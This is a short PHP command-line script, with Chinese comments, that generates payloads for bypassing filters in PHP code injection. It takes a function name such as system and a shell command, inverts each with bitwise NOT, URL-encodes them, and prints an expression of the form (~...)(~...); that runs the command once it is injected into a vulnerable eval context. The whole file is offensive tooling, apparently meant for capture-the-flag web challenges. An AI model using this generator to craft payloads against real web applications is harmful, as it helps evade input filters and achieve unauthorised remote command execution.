<?php
//在命令行中运行

/*author yu22x*/

fwrite(STDOUT,'[+]your function: ');

#   直接输入 函数即可，不需要输入括号.  比如:   system
$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';
